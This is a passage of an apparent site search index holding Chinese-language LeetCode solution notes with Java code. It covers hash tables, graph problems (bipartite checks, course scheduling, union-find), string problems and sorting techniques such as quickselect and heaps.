Leetcode / \u529B\u6263
public boolean containsDuplicate(int[] nums) { Set<Integer> set = new HashSet<>(); for (int num : nums) { set.add(num); } return set.size() < nums.length;
}`},{header:"3. \u6700\u957F\u548C\u8C10\u5E8F\u5217",slug:"_3-\u6700\u957F\u548C\u8C10\u5E8F\u5217",content:`594. Longest Harmonious Subsequence (Easy)
Leetcode / \u529B\u6263
Input: [1,3,2,2,5,2,3,7]
Output: 5
Explanation: The longest harmonious subsequence is [3,2,2,2,3].
\u548C\u8C10\u5E8F\u5217\u4E2D\u6700\u5927\u6570\u548C\u6700\u5C0F\u6570\u4E4B\u5DEE\u6B63\u597D\u4E3A 1\uFF0C\u5E94\u8BE5\u6CE8\u610F\u7684\u662F\u5E8F\u5217\u7684\u5143\u7D20\u4E0D\u4E00\u5B9A\u662F\u6570\u7EC4\u7684\u8FDE\u7EED\u5143\u7D20\u3002
public int findLHS(int[] nums) { Map<Integer, Integer> countForNum = new HashMap<>(); for (int num : nums) { countForNum.put(num, countForNum.getOrDefault(num, 0) + 1); } int longest = 0; for (int num : countForNum.keySet()) { if (countForNum.containsKey(num + 1)) { longest = Math.max(longest, countForNum.get(num + 1) + countForNum.get(num)); } } return longest;
}`},{header:"4. \u6700\u957F\u8FDE\u7EED\u5E8F\u5217",slug:"_4-\u6700\u957F\u8FDE\u7EED\u5E8F\u5217",content:`128. Longest Consecutive Sequence (Hard)
Leetcode / \u529B\u6263
Given [100, 4, 200, 1, 3, 2],
The longest consecutive elements sequence is [1, 2, 3, 4]. Return its length: 4.
\u8981\u6C42\u4EE5 O(N) \u7684\u65F6\u95F4\u590D\u6742\u5EA6\u6C42\u89E3\u3002
public int longestConsecutive(int[] nums) { Map<Integer, Integer> countForNum = new HashMap<>(); for (int num : nums) { countForNum.put(num, 1); } for (int num : nums) { forward(countForNum, num); } return maxCount(countForNum);
} private int forward(Map<Integer, Integer> countForNum, int num) { if (!countForNum.containsKey(num)) { return 0; } int cnt = countForNum.get(num); if (cnt > 1) { return cnt; } cnt = forward(countForNum, num + 1) + 1; countForNum.put(num, cnt); return cnt;
} private int maxCount(Map<Integer, Integer> countForNum) { int max = 0; for (int num : countForNum.keySet()) { max = Math.max(max, countForNum.get(num)); } return max;
}`}]},{path:"/leetcode/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E5%9B%BE.html",title:"Leetcode \u9898\u89E3 - \u56FE",pathLocale:"/",contents:[{header:"Leetcode \u9898\u89E3 - \u56FE",slug:"leetcode-\u9898\u89E3-\u56FE",content:`Leetcode \u9898\u89E3 - \u56FE \u4E8C\u5206\u56FE 1. \u5224\u65AD\u662F\u5426\u4E3A\u4E8C\u5206\u56FE \u62D3\u6251\u6392\u5E8F 1. \u8BFE\u7A0B\u5B89\u6392\u7684\u5408\u6CD5\u6027
2. \u8BFE\u7A0B\u5B89\u6392\u7684\u987A\u5E8F \u5E76\u67E5\u96C6 1. \u5197\u4F59\u8FDE\u63A5`},{header:"\u4E8C\u5206\u56FE",slug:"\u4E8C\u5206\u56FE",content:"\u5982\u679C\u53EF\u4EE5\u7528\u4E24\u79CD\u989C\u8272\u5BF9\u56FE\u4E2D\u7684\u8282\u70B9\u8FDB\u884C\u7740\u8272\uFF0C\u5E76\u4E14\u4FDD\u8BC1\u76F8\u90BB\u7684\u8282\u70B9\u989C\u8272\u4E0D\u540C\uFF0C\u90A3\u4E48\u8FD9\u4E2A\u56FE\u5C31\u662F\u4E8C\u5206\u56FE\u3002"},{header:"1. \u5224\u65AD\u662F\u5426\u4E3A\u4E8C\u5206\u56FE",slug:"_1-\u5224\u65AD\u662F\u5426\u4E3A\u4E8C\u5206\u56FE",content:`785. Is Graph Bipartite? (Medium)
Leetcode / \u529B\u6263
Input: [[1,3], [0,2], [1,3], [0,2]]
Output: true
Explanation:
The graph looks like this:
0----1
| |
| |
3----2
We can divide the vertices into two groups: {0, 2} and {1, 3}.
Example 2:
Input: [[1,2,3], [0,2], [0,1,3], [0,2]]
Output: false
Explanation:
The graph looks like this:
0----1
| \\ |
| \\ |
3----2
We cannot find a way to divide the set of nodes into two independent subsets.
public boolean isBipartite(int[][] graph) { int[] colors = new int[graph.length]; Arrays.fill(colors, -1); for (int i = 0; i < graph.length; i++) { // \u5904\u7406\u56FE\u4E0D\u662F\u8FDE\u901A\u7684\u60C5\u51B5 if (colors[i] == -1 && !isBipartite(i, 0, colors, graph)) { return false; } } return true;
} private boolean isBipartite(int curNode, int curColor, int[] colors, int[][] graph) { if (colors[curNode] != -1) { return colors[curNode] == curColor; } colors[curNode] = curColor; for (int nextNode : graph[curNode]) { if (!isBipartite(nextNode, 1 - curColor, colors, graph)) { return false; } } return true;
}`},{header:"\u62D3\u6251\u6392\u5E8F",slug:"\u62D3\u6251\u6392\u5E8F",content:"\u5E38\u7528\u4E8E\u5728\u5177\u6709\u5148\u5E8F\u5173\u7CFB\u7684\u4EFB\u52A1\u89C4\u5212\u4E2D\u3002"},{header:"1. \u8BFE\u7A0B\u5B89\u6392\u7684\u5408\u6CD5\u6027",slug:"_1-\u8BFE\u7A0B\u5B89\u6392\u7684\u5408\u6CD5\u6027",content:`207. Course Schedule (Medium)
Leetcode / \u529B\u6263
2, [[1,0]]
return true
2, [[1,0],[0,1]]
return false
\u9898\u76EE\u63CF\u8FF0\uFF1A\u4E00\u4E2A\u8BFE\u7A0B\u53EF\u80FD\u4F1A\u5148\u4FEE\u8BFE\u7A0B\uFF0C\u5224\u65AD\u7ED9\u5B9A\u7684\u5148\u4FEE\u8BFE\u7A0B\u89C4\u5B9A\u662F\u5426\u5408\u6CD5\u3002
\u672C\u9898\u4E0D\u9700\u8981\u4F7F\u7528\u62D3\u6251\u6392\u5E8F\uFF0C\u53EA\u9700\u8981\u68C0\u6D4B\u6709\u5411\u56FE\u662F\u5426\u5B58\u5728\u73AF\u5373\u53EF\u3002
public boolean canFinish(int numCourses, int[][] prerequisites) { List<Integer>[] graphic = new List[numCourses]; for (int i = 0; i < numCourses; i++) { graphic[i] = new ArrayList<>(); } for (int[] pre : prerequisites) { graphic[pre[0]].add(pre[1]); } boolean[] globalMarked = new boolean[numCourses]; boolean[] localMarked = new boolean[numCourses]; for (int i = 0; i < numCourses; i++) { if (hasCycle(globalMarked, localMarked, graphic, i)) { return false; } } return true;
} private boolean hasCycle(boolean[] globalMarked, boolean[] localMarked, List<Integer>[] graphic, int curNode) { if (localMarked[curNode]) { return true; } if (globalMarked[curNode]) { return false; } globalMarked[curNode] = true; localMarked[curNode] = true; for (int nextNode : graphic[curNode]) { if (hasCycle(globalMarked, localMarked, graphic, nextNode)) { return true; } } localMarked[curNode] = false; return false;
}`},{header:"2. \u8BFE\u7A0B\u5B89\u6392\u7684\u987A\u5E8F",slug:"_2-\u8BFE\u7A0B\u5B89\u6392\u7684\u987A\u5E8F",content:`210. Course Schedule II (Medium)
Leetcode / \u529B\u6263
4, [[1,0],[2,0],[3,1],[3,2]]
There are a total of 4 courses to take. To take course 3 you should have finished both courses 1 and 2. Both courses 1 and 2 should be taken after you finished course 0. So one correct course order is [0,1,2,3]. Another correct ordering is[0,2,1,3].
\u4F7F\u7528 DFS \u6765\u5B9E\u73B0\u62D3\u6251\u6392\u5E8F\uFF0C\u4F7F\u7528\u4E00\u4E2A\u6808\u5B58\u50A8\u540E\u5E8F\u904D\u5386\u7ED3\u679C\uFF0C\u8FD9\u4E2A\u6808\u7684\u9006\u5E8F\u7ED3\u679C\u5C31\u662F\u62D3\u6251\u6392\u5E8F\u7ED3\u679C\u3002
\u8BC1\u660E\uFF1A\u5BF9\u4E8E\u4EFB\u4F55\u5148\u5E8F\u5173\u7CFB\uFF1Av->w\uFF0C\u540E\u5E8F\u904D\u5386\u7ED3\u679C\u53EF\u4EE5\u4FDD\u8BC1 w \u5148\u8FDB\u5165\u6808\u4E2D\uFF0C\u56E0\u6B64\u6808\u7684\u9006\u5E8F\u7ED3\u679C\u4E2D v \u4F1A\u5728 w \u4E4B\u524D\u3002
public int[] findOrder(int numCourses, int[][] prerequisites) { List<Integer>[] graphic = new List[numCourses]; for (int i = 0; i < numCourses; i++) { graphic[i] = new ArrayList<>(); } for (int[] pre : prerequisites) { graphic[pre[0]].add(pre[1]); } Stack<Integer> postOrder = new Stack<>(); boolean[] globalMarked = new boolean[numCourses]; boolean[] localMarked = new boolean[numCourses]; for (int i = 0; i < numCourses; i++) { if (hasCycle(globalMarked, localMarked, graphic, i, postOrder)) { return new int[0]; } } int[] orders = new int[numCourses]; for (int i = numCourses - 1; i >= 0; i--) { orders[i] = postOrder.pop(); } return orders;
} private boolean hasCycle(boolean[] globalMarked, boolean[] localMarked, List<Integer>[] graphic, int curNode, Stack<Integer> postOrder) { if (localMarked[curNode]) { return true; } if (globalMarked[curNode]) { return false; } globalMarked[curNode] = true; localMarked[curNode] = true; for (int nextNode : graphic[curNode]) { if (hasCycle(globalMarked, localMarked, graphic, nextNode, postOrder)) { return true; } } localMarked[curNode] = false; postOrder.push(curNode); return false;
}`},{header:"\u5E76\u67E5\u96C6",slug:"\u5E76\u67E5\u96C6",content:"\u5E76\u67E5\u96C6\u53EF\u4EE5\u52A8\u6001\u5730\u8FDE\u901A\u4E24\u4E2A\u70B9\uFF0C\u5E76\u4E14\u53EF\u4EE5\u975E\u5E38\u5FEB\u901F\u5730\u5224\u65AD\u4E24\u4E2A\u70B9\u662F\u5426\u8FDE\u901A\u3002"},{header:"1. \u5197\u4F59\u8FDE\u63A5",slug:"_1-\u5197\u4F59\u8FDE\u63A5",content:`684. Redundant Connection (Medium)
Leetcode / \u529B\u6263
Input: [[1,2], [1,3], [2,3]]
Output: [2,3]
Explanation: The given undirected graph will be like this: 1 / \\
2 - 3
\u9898\u76EE\u63CF\u8FF0\uFF1A\u6709\u4E00\u7CFB\u5217\u7684\u8FB9\u8FDE\u6210\u7684\u56FE\uFF0C\u627E\u51FA\u4E00\u6761\u8FB9\uFF0C\u79FB\u9664\u5B83\u4E4B\u540E\u8BE5\u56FE\u80FD\u591F\u6210\u4E3A\u4E00\u68F5\u6811\u3002
public int[] findRedundantConnection(int[][] edges) { int N = edges.length; UF uf = new UF(N); for (int[] e : edges) { int u = e[0], v = e[1]; if (uf.connect(u, v)) { return e; } uf.union(u, v); } return new int[]{-1, -1};
} private class UF { private int[] id; UF(int N) { id = new int[N + 1]; for (int i = 0; i < id.length; i++) { id[i] = i; } } void union(int u, int v) { int uID = find(u); int vID = find(v); if (uID == vID) { return; } for (int i = 0; i < id.length; i++) { if (id[i] == uID) { id[i] = vID; } } } int find(int p) { return id[p]; } boolean connect(int u, int v) { return find(u) == find(v); }
}`}]},{path:"/leetcode/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E5%AD%97%E7%AC%A6%E4%B8%B2.html",title:"Leetcode \u9898\u89E3 - \u5B57\u7B26\u4E32",pathLocale:"/",contents:[{header:"Leetcode \u9898\u89E3 - \u5B57\u7B26\u4E32",slug:"leetcode-\u9898\u89E3-\u5B57\u7B26\u4E32",content:`Leetcode \u9898\u89E3 - \u5B57\u7B26\u4E32 1. \u5B57\u7B26\u4E32\u5FAA\u73AF\u79FB\u4F4D\u5305\u542B
2. \u5B57\u7B26\u4E32\u5FAA\u73AF\u79FB\u4F4D
3. \u5B57\u7B26\u4E32\u4E2D\u5355\u8BCD\u7684\u7FFB\u8F6C
4. \u4E24\u4E2A\u5B57\u7B26\u4E32\u5305\u542B\u7684\u5B57\u7B26\u662F\u5426\u5B8C\u5168\u76F8\u540C
5. \u8BA1\u7B97\u4E00\u7EC4\u5B57\u7B26\u96C6\u5408\u53EF\u4EE5\u7EC4\u6210\u7684\u56DE\u6587\u5B57\u7B26\u4E32\u7684\u6700\u5927\u957F\u5EA6
6. \u5B57\u7B26\u4E32\u540C\u6784
7. \u56DE\u6587\u5B50\u5B57\u7B26\u4E32\u4E2A\u6570
8. \u5224\u65AD\u4E00\u4E2A\u6574\u6570\u662F\u5426\u662F\u56DE\u6587\u6570
9. \u7EDF\u8BA1\u4E8C\u8FDB\u5236\u5B57\u7B26\u4E32\u4E2D\u8FDE\u7EED 1 \u548C\u8FDE\u7EED 0 \u6570\u91CF\u76F8\u540C\u7684\u5B50\u5B57\u7B26\u4E32\u4E2A\u6570`},{header:"1. \u5B57\u7B26\u4E32\u5FAA\u73AF\u79FB\u4F4D\u5305\u542B",slug:"_1-\u5B57\u7B26\u4E32\u5FAA\u73AF\u79FB\u4F4D\u5305\u542B",content:`\u7F16\u7A0B\u4E4B\u7F8E 3.1
s1 = AABCD, s2 = CDAA
Return : true
\u7ED9\u5B9A\u4E24\u4E2A\u5B57\u7B26\u4E32 s1 \u548C s2\uFF0C\u8981\u6C42\u5224\u5B9A s2 \u662F\u5426\u80FD\u591F\u88AB s1 \u505A\u5FAA\u73AF\u79FB\u4F4D\u5F97\u5230\u7684\u5B57\u7B26\u4E32\u5305\u542B\u3002
s1 \u8FDB\u884C\u5FAA\u73AF\u79FB\u4F4D\u7684\u7ED3\u679C\u662F s1s1 \u7684\u5B50\u5B57\u7B26\u4E32\uFF0C\u56E0\u6B64\u53EA\u8981\u5224\u65AD s2 \u662F\u5426\u662F s1s1 \u7684\u5B50\u5B57\u7B26\u4E32\u5373\u53EF\u3002`},{header:"2. \u5B57\u7B26\u4E32\u5FAA\u73AF\u79FB\u4F4D",slug:"_2-\u5B57\u7B26\u4E32\u5FAA\u73AF\u79FB\u4F4D",content:`\u7F16\u7A0B\u4E4B\u7F8E 2.17
s = "abcd123" k = 3
Return "123abcd"
\u5C06\u5B57\u7B26\u4E32\u5411\u53F3\u5FAA\u73AF\u79FB\u52A8 k \u4F4D\u3002
\u5C06 abcd123 \u4E2D\u7684 abcd \u548C 123 \u5355\u72EC\u7FFB\u8F6C\uFF0C\u5F97\u5230 dcba321\uFF0C\u7136\u540E\u5BF9\u6574\u4E2A\u5B57\u7B26\u4E32\u8FDB\u884C\u7FFB\u8F6C\uFF0C\u5F97\u5230 123abcd\u3002`},{header:"3. \u5B57\u7B26\u4E32\u4E2D\u5355\u8BCD\u7684\u7FFB\u8F6C",slug:"_3-\u5B57\u7B26\u4E32\u4E2D\u5355\u8BCD\u7684\u7FFB\u8F6C",content:`\u7A0B\u5E8F\u5458\u4EE3\u7801\u9762\u8BD5\u6307\u5357
s = "I am a student"
Return "student a am I"
\u5C06\u6BCF\u4E2A\u5355\u8BCD\u7FFB\u8F6C\uFF0C\u7136\u540E\u5C06\u6574\u4E2A\u5B57\u7B26\u4E32\u7FFB\u8F6C\u3002`},{header:"4. \u4E24\u4E2A\u5B57\u7B26\u4E32\u5305\u542B\u7684\u5B57\u7B26\u662F\u5426\u5B8C\u5168\u76F8\u540C",slug:"_4-\u4E24\u4E2A\u5B57\u7B26\u4E32\u5305\u542B\u7684\u5B57\u7B26\u662F\u5426\u5B8C\u5168\u76F8\u540C",content:`242. Valid Anagram (Easy)
Leetcode / \u529B\u6263
s = "anagram", t = "nagaram", return true.
s = "rat", t = "car", return false.
\u53EF\u4EE5\u7528 HashMap \u6765\u6620\u5C04\u5B57\u7B26\u4E0E\u51FA\u73B0\u6B21\u6570\uFF0C\u7136\u540E\u6BD4\u8F83\u4E24\u4E2A\u5B57\u7B26\u4E32\u51FA\u73B0\u7684\u5B57\u7B26\u6570\u91CF\u662F\u5426\u76F8\u540C\u3002
\u7531\u4E8E\u672C\u9898\u7684\u5B57\u7B26\u4E32\u53EA\u5305\u542B 26 \u4E2A\u5C0F\u5199\u5B57\u7B26\uFF0C\u56E0\u6B64\u53EF\u4EE5\u4F7F\u7528\u957F\u5EA6\u4E3A 26 \u7684\u6574\u578B\u6570\u7EC4\u5BF9\u5B57\u7B26\u4E32\u51FA\u73B0\u7684\u5B57\u7B26\u8FDB\u884C\u7EDF\u8BA1\uFF0C\u4E0D\u518D\u4F7F\u7528 HashMap\u3002
public boolean isAnagram(String s, String t) { int[] cnts = new int[26]; for (char c : s.toCharArray()) { cnts[c - 'a']++; } for (char c : t.toCharArray()) { cnts[c - 'a']--; } for (int cnt : cnts) { if (cnt != 0) { return false; } } return true;
}`},{header:"5. \u8BA1\u7B97\u4E00\u7EC4\u5B57\u7B26\u96C6\u5408\u53EF\u4EE5\u7EC4\u6210\u7684\u56DE\u6587\u5B57\u7B26\u4E32\u7684\u6700\u5927\u957F\u5EA6",slug:"_5-\u8BA1\u7B97\u4E00\u7EC4\u5B57\u7B26\u96C6\u5408\u53EF\u4EE5\u7EC4\u6210\u7684\u56DE\u6587\u5B57\u7B26\u4E32\u7684\u6700\u5927\u957F\u5EA6",content:`409. Longest Palindrome (Easy)
Leetcode / \u529B\u6263
Input : "abccccdd"
Output : 7
Explanation : One longest palindrome that can be built is "dccaccd", whose length is 7.
\u4F7F\u7528\u957F\u5EA6\u4E3A 256 \u7684\u6574\u578B\u6570\u7EC4\u6765\u7EDF\u8BA1\u6BCF\u4E2A\u5B57\u7B26\u51FA\u73B0\u7684\u4E2A\u6570\uFF0C\u6BCF\u4E2A\u5B57\u7B26\u6709\u5076\u6570\u4E2A\u53EF\u4EE5\u7528\u6765\u6784\u6210\u56DE\u6587\u5B57\u7B26\u4E32\u3002
\u56E0\u4E3A\u56DE\u6587\u5B57\u7B26\u4E32\u6700\u4E2D\u95F4\u7684\u90A3\u4E2A\u5B57\u7B26\u53EF\u4EE5\u5355\u72EC\u51FA\u73B0\uFF0C\u6240\u4EE5\u5982\u679C\u6709\u5355\u72EC\u7684\u5B57\u7B26\u5C31\u628A\u5B83\u653E\u5230\u6700\u4E2D\u95F4\u3002
public int longestPalindrome(String s) { int[] cnts = new int[256]; for (char c : s.toCharArray()) { cnts[c]++; } int palindrome = 0; for (int cnt : cnts) { palindrome += (cnt / 2) * 2; } if (palindrome < s.length()) { palindrome++; // \u8FD9\u4E2A\u6761\u4EF6\u4E0B s \u4E2D\u4E00\u5B9A\u6709\u5355\u4E2A\u672A\u4F7F\u7528\u7684\u5B57\u7B26\u5B58\u5728\uFF0C\u53EF\u4EE5\u628A\u8FD9\u4E2A\u5B57\u7B26\u653E\u5230\u56DE\u6587\u7684\u6700\u4E2D\u95F4 } return palindrome;
}`},{header:"6. \u5B57\u7B26\u4E32\u540C\u6784",slug:"_6-\u5B57\u7B26\u4E32\u540C\u6784",content:`205. Isomorphic Strings (Easy)
Leetcode / \u529B\u6263
Given "egg", "add", return true.
Given "foo", "bar", return false.
Given "paper", "title", return true.
\u8BB0\u5F55\u4E00\u4E2A\u5B57\u7B26\u4E0A\u6B21\u51FA\u73B0\u7684\u4F4D\u7F6E\uFF0C\u5982\u679C\u4E24\u4E2A\u5B57\u7B26\u4E32\u4E2D\u7684\u5B57\u7B26\u4E0A\u6B21\u51FA\u73B0\u7684\u4F4D\u7F6E\u4E00\u6837\uFF0C\u90A3\u4E48\u5C31\u5C5E\u4E8E\u540C\u6784\u3002
public boolean isIsomorphic(String s, String t) { int[] preIndexOfS = new int[256]; int[] preIndexOfT = new int[256]; for (int i = 0; i < s.length(); i++) { char sc = s.charAt(i), tc = t.charAt(i); if (preIndexOfS[sc] != preIndexOfT[tc]) { return false; } preIndexOfS[sc] = i + 1; preIndexOfT[tc] = i + 1; } return true;
}`},{header:"7. \u56DE\u6587\u5B50\u5B57\u7B26\u4E32\u4E2A\u6570",slug:"_7-\u56DE\u6587\u5B50\u5B57\u7B26\u4E32\u4E2A\u6570",content:`647. Palindromic Substrings (Medium)
Leetcode / \u529B\u6263
Input: "aaa"
Output: 6
Explanation: Six palindromic strings: "a", "a", "a", "aa", "aa", "aaa".
\u4ECE\u5B57\u7B26\u4E32\u7684\u67D0\u4E00\u4F4D\u5F00\u59CB\uFF0C\u5C1D\u8BD5\u7740\u53BB\u6269\u5C55\u5B50\u5B57\u7B26\u4E32\u3002
private int cnt = 0; public int countSubstrings(String s) { for (int i = 0; i < s.length(); i++) { extendSubstrings(s, i, i); // \u5947\u6570\u957F\u5EA6 extendSubstrings(s, i, i + 1); // \u5076\u6570\u957F\u5EA6 } return cnt;
} private void extendSubstrings(String s, int start, int end) { while (start >= 0 && end < s.length() && s.charAt(start) == s.charAt(end)) { start--; end++; cnt++; }
}`},{header:"8. \u5224\u65AD\u4E00\u4E2A\u6574\u6570\u662F\u5426\u662F\u56DE\u6587\u6570",slug:"_8-\u5224\u65AD\u4E00\u4E2A\u6574\u6570\u662F\u5426\u662F\u56DE\u6587\u6570",content:`9. Palindrome Number (Easy)
Leetcode / \u529B\u6263
\u8981\u6C42\u4E0D\u80FD\u4F7F\u7528\u989D\u5916\u7A7A\u95F4\uFF0C\u4E5F\u5C31\u4E0D\u80FD\u5C06\u6574\u6570\u8F6C\u6362\u4E3A\u5B57\u7B26\u4E32\u8FDB\u884C\u5224\u65AD\u3002
\u5C06\u6574\u6570\u5206\u6210\u5DE6\u53F3\u4E24\u90E8\u5206\uFF0C\u53F3\u8FB9\u90A3\u90E8\u5206\u9700\u8981\u8F6C\u7F6E\uFF0C\u7136\u540E\u5224\u65AD\u8FD9\u4E24\u90E8\u5206\u662F\u5426\u76F8\u7B49\u3002
public boolean isPalindrome(int x) { if (x == 0) { return true; } if (x < 0 || x % 10 == 0) { return false; } int right = 0; while (x > right) { right = right * 10 + x % 10; x /= 10; } return x == right || x == right / 10;
}`},{header:"9. \u7EDF\u8BA1\u4E8C\u8FDB\u5236\u5B57\u7B26\u4E32\u4E2D\u8FDE\u7EED 1 \u548C\u8FDE\u7EED 0 \u6570\u91CF\u76F8\u540C\u7684\u5B50\u5B57\u7B26\u4E32\u4E2A\u6570",slug:"_9-\u7EDF\u8BA1\u4E8C\u8FDB\u5236\u5B57\u7B26\u4E32\u4E2D\u8FDE\u7EED-1-\u548C\u8FDE\u7EED-0-\u6570\u91CF\u76F8\u540C\u7684\u5B50\u5B57\u7B26\u4E32\u4E2A\u6570",content:`696. Count Binary Substrings (Easy)
Leetcode / \u529B\u6263
Input: "00110011"
Output: 6
Explanation: There are 6 substrings that have equal number of consecutive 1's and 0's: "0011", "01", "1100", "10", "0011", and "01".
public int countBinarySubstrings(String s) { int preLen = 0, curLen = 1, count = 0; for (int i = 1; i < s.length(); i++) { if (s.charAt(i) == s.charAt(i - 1)) { curLen++; } else { preLen = curLen; curLen = 1; } if (preLen >= curLen) { count++; } } return count;
}`}]},{path:"/leetcode/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E6%8E%92%E5%BA%8F.html",title:"Leetcode \u9898\u89E3 - \u6392\u5E8F",pathLocale:"/",contents:[{header:"Leetcode \u9898\u89E3 - \u6392\u5E8F",slug:"leetcode-\u9898\u89E3-\u6392\u5E8F",content:`Leetcode \u9898\u89E3 - \u6392\u5E8F \u5FEB\u901F\u9009\u62E9
\u5806 1. Kth Element \u6876\u6392\u5E8F 1. \u51FA\u73B0\u9891\u7387\u6700\u591A\u7684 k \u4E2A\u5143\u7D20
2. \u6309\u7167\u5B57\u7B26\u51FA\u73B0\u6B21\u6570\u5BF9\u5B57\u7B26\u4E32\u6392\u5E8F \u8377\u5170\u56FD\u65D7\u95EE\u9898 1. \u6309\u989C\u8272\u8FDB\u884C\u6392\u5E8F`},{header:"\u5FEB\u901F\u9009\u62E9",slug:"\u5FEB\u901F\u9009\u62E9",content:`\u7528\u4E8E\u6C42\u89E3 Kth Element \u95EE\u9898\uFF0C\u4E5F\u5C31\u662F\u7B2C K \u4E2A\u5143\u7D20\u7684\u95EE\u9898\u3002
\u53EF\u4EE5\u4F7F\u7528\u5FEB\u901F\u6392\u5E8F\u7684 partition() \u8FDB\u884C\u5B9E\u73B0\u3002\u9700\u8981\u5148\u6253\u4E71\u6570\u7EC4\uFF0C\u5426\u5219\u6700\u574F\u60C5\u51B5\u4E0B\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(N2)\u3002`},{header:"\u5806",slug:"\u5806",content:`\u7528\u4E8E\u6C42\u89E3 TopK Elements \u95EE\u9898\uFF0C\u4E5F\u5C31\u662F K \u4E2A\u6700\u5C0F\u5143\u7D20\u7684\u95EE\u9898\u3002\u4F7F\u7528\u6700\u5C0F\u5806\u6765\u5B9E\u73B0 TopK \u95EE\u9898\uFF0C\u6700\u5C0F\u5806\u4F7F\u7528\u5927\u9876\u5806\u6765\u5B9E\u73B0\uFF0C\u5927\u9876\u5806\u7684\u5806\u9876\u5143\u7D20\u4E3A\u5F53\u524D\u5806\u7684\u6700\u5927\u5143\u7D20\u3002\u5B9E\u73B0\u8FC7\u7A0B\uFF1A\u4E0D\u65AD\u5730\u5F80\u5927\u9876\u5806\u4E2D\u63D2\u5165\u65B0\u5143\u7D20\uFF0C\u5F53\u5806\u4E2D\u5143\u7D20\u7684\u6570\u91CF\u5927\u4E8E k \u65F6\uFF0C\u79FB\u9664\u5806\u9876\u5143\u7D20\uFF0C\u4E5F\u5C31\u662F\u5F53\u524D\u5806\u4E2D\u6700\u5927\u7684\u5143\u7D20\uFF0C\u5269\u4E0B\u7684\u5143\u7D20\u90FD\u4E3A\u5F53\u524D\u6DFB\u52A0\u8FC7\u7684\u5143\u7D20\u4E2D\u6700\u5C0F\u7684 K \u4E2A\u5143\u7D20\u3002\u63D2\u5165\u548C\u79FB\u9664\u5806\u9876\u5143\u7D20\u7684\u65F6\u95F4\u590D\u6742\u5EA6\u90FD\u4E3A log2N\u3002
\u5806\u4E5F\u53EF\u4EE5\u7528\u4E8E\u6C42\u89E3 Kth Element \u95EE\u9898\uFF0C\u5F97\u5230\u4E86\u5927\u5C0F\u4E3A K \u7684\u6700\u5C0F\u5806\u4E4B\u540E\uFF0C\u56E0\u4E3A\u4F7F\u7528\u4E86\u5927\u9876\u5806\u6765\u5B9E\u73B0\uFF0C\u56E0\u6B64\u5806\u9876\u5143\u7D20\u5C31\u662F\u7B2C K \u5927\u7684\u5143\u7D20\u3002
\u5FEB\u901F\u9009\u62E9\u4E5F\u53EF\u4EE5\u6C42\u89E3 TopK Elements \u95EE\u9898\uFF0C\u56E0\u4E3A\u627E\u5230 Kth Element \u4E4B\u540E\uFF0C\u518D\u904D\u5386\u4E00\u6B21\u6570\u7EC4\uFF0C\u6240\u6709\u5C0F\u4E8E\u7B49\u4E8E Kth Element \u7684\u5143\u7D20\u90FD\u662F TopK Elements\u3002
\u53EF\u4EE5\u770B\u5230\uFF0C\u5FEB\u901F\u9009\u62E9\u548C\u5806\u6392\u5E8F\u90FD\u53EF\u4EE5\u6C42\u89E3 Kth Element \u548C TopK Elements \u95EE\u9898\u3002`},{header:"1. Kth Element",slug:"_1-kth-element",content:`215. Kth Largest Element in an Array (Medium)
Leetcode / \u529B\u6263
Input: [3,2,1,5,6,4] and k = 2
Output: 5
\u9898\u76EE\u63CF\u8FF0\uFF1A\u627E\u5230\u5012\u6570\u7B2C k \u4E2A\u7684\u5143\u7D20\u3002
\u6392\u5E8F \uFF1A\u65F6\u95F4\u590D\u6742\u5EA6 O(NlogN)\uFF0C\u7A7A\u95F4\u590D\u6742\u5EA6 O(1)
public int findKthLargest(int[] nums, int k) { Arrays.sort(nums); return nums[nums.length - k];
}
\u5806 \uFF1A\u65F6\u95F4\u590D\u6742\u5EA6 O(NlogK)\uFF0C\u7A7A\u95F4\u590D\u6742\u5EA6 O(K)\u3002
public int findKthLargest(int[] nums, int k) { PriorityQueue<Integer> pq = new PriorityQueue<>(); // \u5C0F\u9876\u5806 for (int val : nums) { pq.add(val); if (pq.size() > k) // \u7EF4\u62A4\u5806\u7684\u5927\u5C0F\u4E3A K pq.poll(); } return pq.peek();
}
\u5FEB\u901F\u9009\u62E9 \uFF1A\u65F6\u95F4\u590D\u6742\u5EA6 O(N)\uFF0C\u7A7A\u95F4\u590D\u6742\u5EA6 O(1)
public int findKthLargest(int[] nums, int k) { k = nums.length - k; int l = 0, h = nums.length - 1; while (l < h) { int j = partition(nums, l, h); if (j == k) { break; } else if (j < k) { l = j + 1; } else { h = j - 1; } } return nums[k];
} private int partition(int[] a, int l, int h) { int i = l, j = h + 1; while (true) { while (a[++i] < a[l] && i < h) ; while (a[--j] > a[l] && j > l) ; if (i >= j) { break; } swap(a, i, j); } swap(a, l, j); return j;
} private void swap(int[] a, int i, int j) { int t = a[i]; a[i] = a[j]; a[j] = t;
}`},{header:"\u6876\u6392\u5E8F",slug:"\u6876\u6392\u5E8F",content:""},{header:"1. \u51FA\u73B0\u9891\u7387\u6700\u591A\u7684 k \u4E2A\u5143\u7D20",slug:"_1-\u51FA\u73B0\u9891\u7387\u6700\u591A\u7684-k-\u4E2A\u5143\u7D20",content:`347. Top K Frequent Elements (Medium)
Leetcode / \u529B\u6263
Given [1,1,1,2,2,3] and k = 2, return [1,2].
\u8BBE\u7F6E\u82E5\u5E72\u4E2A\u6876\uFF0C\u6BCF\u4E2A\u6876\u5B58\u50A8\u51FA\u73B0\u9891\u7387\u76F8\u540C\u7684\u6570\u3002\u6876\u7684\u4E0B\u6807\u8868\u793A\u6570\u51FA\u73B0\u7684\u9891\u7387\uFF0C\u5373\u7B2C i \u4E2A\u6876\u4E2D\u5B58\u50A8\u7684\u6570\u51FA\u73B0\u7684\u9891\u7387\u4E3A i\u3002
\u628A\u6570\u90FD\u653E\u5230\u6876\u4E4B\u540E\uFF0C\u4ECE\u540E\u5411\u524D\u904D\u5386\u6876\uFF0C\u6700\u5148\u5F97\u5230\u7684 k \u4E2A\u6570\u5C31\u662F\u51FA\u73B0\u9891\u7387\u6700\u591A\u7684\u7684 k \u4E2A\u6570\u3002
